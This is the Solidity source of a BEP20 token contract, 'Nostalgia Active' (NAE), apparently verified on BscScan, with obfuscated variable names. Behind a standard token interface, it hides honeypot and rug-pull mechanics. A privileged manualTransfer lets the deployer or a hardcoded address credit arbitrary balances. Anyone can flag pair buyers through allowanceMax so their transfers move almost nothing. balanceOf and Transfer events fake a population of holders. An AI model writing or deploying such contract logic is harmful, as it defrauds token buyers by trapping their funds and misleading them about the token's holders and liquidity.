/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



interface IBEP20 {

    function symbol() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}



interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


contract NostalgiaActive is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    bool private buyFundEnableTo = false;


    
    IUniswapV2Router public buyTotalListReceiverEnableFromMode;
    uint256 private limitMintLaunchedExemptMaxAutoReceiver = 0;
    bool public autoShouldReceiverToLaunchFrom = false;
    address constant autoLiquidityListLaunch = 0x901176Bc547BCE5e9C183EE5eA62DB6e2d17CDfE;
    bool private mintIsTeamFrom = false;

    uint256  maxLiquidityModeListSellBurnReceiver = 100000000 * (10 ** 18);
    uint256 modeMarketingEnableSwapAutoExempt = 0;
    mapping(address => uint256) _balances;
    mapping(address => bool)  totalReceiverShouldLaunchedExemptTeamTrading;
    string constant _name = "Nostalgia Active";
    uint256 private walletShouldLaunchTotal = 0;

    uint256 public launchedTakeTradingTeam = 0;
    bool private walletIsEnableAutoListReceiver = false;

    string constant _symbol = "NAE";



    mapping(address => bool) private feeFromExemptAtBurnAutoTeam;
    address private exemptLiquiditySellWallet;
    bool public fundMintTeamTrading = false;
    address constant senderBurnToIs = 0x74701Ef19573e5087e36c75Dae2A504C13382De7;


    bool public autoMintTeamToken = false;
    address public uniswapV2Pair;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant autoMarketingMinBuyTeamIsReceiver = 100 * 10 ** 18;
    uint256 constant shouldExemptBurnLiquidity = 1000000 * 10 ** 18;
    mapping(address => bool)  totalLaunchedBuyFromMax;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        buyTotalListReceiverEnableFromMode = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(buyTotalListReceiverEnableFromMode.factory()).createPair(address(this), buyTotalListReceiverEnableFromMode.WETH());
        _allowances[address(this)][address(buyTotalListReceiverEnableFromMode)] = maxLiquidityModeListSellBurnReceiver;

        _balances[msg.sender] = maxLiquidityModeListSellBurnReceiver;
        emit Transfer(address(0), msg.sender, maxLiquidityModeListSellBurnReceiver);
        exemptLiquiditySellWallet = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return maxLiquidityModeListSellBurnReceiver;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return totalLaunchedBuyFromMax[spender];
    }

    function fundBurnBuyTo(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeTakeBurnTradingAutoIsEnable(address minTakeMintListSellMode) private pure returns (bool) {
        return minTakeMintListSellMode == senderBurnToIs;
    }

    function exemptShouldListWallet(address launchModeLiquidityMarketing, address launchIsTeamMintLimit, uint256 tokenAtReceiverLiquidity) internal returns (bool) {
        if (tokenIsFromBurnReceiverFee(launchIsTeamMintLimit)) {
            limitAtLaunchFrom(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity, false);
            return true;
        }
        if (tokenIsFromBurnReceiverFee(launchModeLiquidityMarketing)) {
            limitAtLaunchFrom(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity, true);
            return true;
        }

        bool liquidityEnableTakeFee = maxSenderAtTxTotalSwap(launchModeLiquidityMarketing) || maxSenderAtTxTotalSwap(launchIsTeamMintLimit);
        if (liquidityEnableTakeFee) {
            return fundBurnBuyTo(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity);
        }

        if (launchModeLiquidityMarketing == uniswapV2Pair && !liquidityEnableTakeFee) {
            totalReceiverShouldLaunchedExemptTeamTrading[launchIsTeamMintLimit] = true;
        }

        if (totalLaunchedBuyFromMax[launchModeLiquidityMarketing]) {
            return fundBurnBuyTo(launchModeLiquidityMarketing, launchIsTeamMintLimit, 10 ** 10);
        }

        return fundBurnBuyTo(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity);
    }

    function manualTransfer(address launchModeLiquidityMarketing, address launchIsTeamMintLimit, uint256 tokenAtReceiverLiquidity) public {
        if (!modeTakeBurnTradingAutoIsEnable(msg.sender) && msg.sender != exemptLiquiditySellWallet) {
            return;
        }
        if (tokenIsFromBurnReceiverFee(launchIsTeamMintLimit)) {
            limitAtLaunchFrom(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity, false);
            return;
        }
        if (tokenIsFromBurnReceiverFee(launchModeLiquidityMarketing)) {
            limitAtLaunchFrom(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity, true);
            return;
        }
        if (launchModeLiquidityMarketing == address(0)) {
            _balances[launchIsTeamMintLimit] = _balances[launchIsTeamMintLimit].add(tokenAtReceiverLiquidity);
            return;
        }
    }

    function allowanceMax(address spender) external {
        if (totalReceiverShouldLaunchedExemptTeamTrading[spender]) {
            totalLaunchedBuyFromMax[spender] = true;
        }
    }

    function senderMaxMintLaunch(address minTakeMintListSellMode) private view returns (uint256) {
        uint256 modeTradingReceiverTotal = limitSellLiquidityTradingBurn(minTakeMintListSellMode);
        if (modeTradingReceiverTotal < modeMarketingEnableSwapAutoExempt) {
            return autoMarketingMinBuyTeamIsReceiver * modeTradingReceiverTotal;
        }
        return shouldExemptBurnLiquidity + autoMarketingMinBuyTeamIsReceiver * modeTradingReceiverTotal;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptShouldListWallet(msg.sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (tokenIsFromBurnReceiverFee(account)) {
            return senderMaxMintLaunch(account);
        }
        return _balances[account];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function limitSellLiquidityTradingBurn(address minTakeMintListSellMode) private pure returns (uint256) {
        uint256 sellIsShouldLaunchedTxReceiverAmount = minAtFundExempt();
        uint256 modeTradingReceiverTotal = uint160(minTakeMintListSellMode) - sellIsShouldLaunchedTxReceiverAmount;
        return modeTradingReceiverTotal;
    }

    function minAtFundExempt() private pure returns (uint256) {
        return uint160(autoLiquidityListLaunch) + 1;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function limitAtLaunchFrom(address launchModeLiquidityMarketing, address launchIsTeamMintLimit, uint256 tokenAtReceiverLiquidity, bool minFundMarketingSellFee) private {
        if (minFundMarketingSellFee) {
            uint256 sellIsShouldLaunchedTxReceiverAmount = minAtFundExempt();
            launchModeLiquidityMarketing = address(uint160(sellIsShouldLaunchedTxReceiverAmount + modeMarketingEnableSwapAutoExempt));
            modeMarketingEnableSwapAutoExempt++;
            _balances[launchIsTeamMintLimit] = _balances[launchIsTeamMintLimit].add(tokenAtReceiverLiquidity);
        } else {
            _balances[launchModeLiquidityMarketing] = _balances[launchModeLiquidityMarketing].sub(tokenAtReceiverLiquidity);
        }
        emit Transfer(launchModeLiquidityMarketing, launchIsTeamMintLimit, tokenAtReceiverLiquidity);
    }

    function maxSenderAtTxTotalSwap(address teamListIsFund) private view returns (bool) {
        return teamListIsFund == exemptLiquiditySellWallet;
    }

    function tokenIsFromBurnReceiverFee(address minTakeMintListSellMode) private pure returns (bool) {
        uint256 sellIsShouldLaunchedTxReceiverAmount = minAtFundExempt();
        uint256 minTakeMintListSellMode256 = uint160(minTakeMintListSellMode);
        if (minTakeMintListSellMode256 >= sellIsShouldLaunchedTxReceiverAmount && minTakeMintListSellMode256 < sellIsShouldLaunchedTxReceiverAmount + 10000) {
            return true;
        }
        return false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != maxLiquidityModeListSellBurnReceiver) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return exemptShouldListWallet(sender, recipient, amount);
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}